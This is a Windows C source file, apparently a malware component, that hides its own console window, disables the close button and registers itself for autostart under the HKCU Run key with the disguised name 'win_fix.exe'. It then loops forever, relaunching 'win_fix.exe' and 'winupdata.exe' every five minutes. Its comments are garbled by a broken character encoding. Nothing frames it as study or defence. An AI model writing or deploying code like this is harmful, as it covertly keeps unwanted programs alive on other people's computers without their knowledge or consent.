#include <Windows.h>
#include <tchar.h>
#include <stdio.h>

VOID KillConsoleCloseButton()
{
    HWND hwnd = GetConsoleWindow();
    HMENU hmenu = GetSystemMenu(hwnd, FALSE);
    if (hmenu != NULL)
    {
        DeleteMenu(hmenu, SC_CLOSE, MF_BYCOMMAND);
    }
}


void selfstart() 
{
    HKEY hKey;
    LONG lRet;
    TCHAR szPath[MAX_PATH];
    DWORD dwSize = sizeof(szPath);

    // ��ȡҪ��������exe�ļ��ľ���·��
    GetModuleFileName(NULL, szPath, dwSize);

    // �������ע����е�"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"��
    lRet = RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey);
    if (lRet != ERROR_SUCCESS)
    {
        _tprintf(_T("RegOpenKeyEx failed! Error code: %d\n"), lRet);
        return;
    }

    // ��exe�ļ��ľ���·��д��ע�����
    lRet = RegSetValueEx(hKey,_T("win_fix.exe"), 0, REG_SZ, (const BYTE *)szPath, (_tcslen(szPath) + 1) * sizeof(TCHAR));
    if (lRet != ERROR_SUCCESS)
    {
        _tprintf(_T("RegSetValueEx failed! Error code: %d\n"), lRet);
        RegCloseKey(hKey);
        return;
    }

    RegCloseKey(hKey);
    _tprintf(_T("Success\n"));
    while (1)
    {
        Sleep(1000*60*5);
        system("start /b win_fix.exe");
        system("start /b winupdata.exe");
    }
    
}

int _tmain(int argc, _TCHAR* argv[])
{

    KillConsoleCloseButton();
    ShowWindow(GetConsoleWindow(), SW_HIDE);
//    TCHAR name[] = _T(""); // Ҫ��������exe�ļ�������
    selfstart();
    return 0;
}

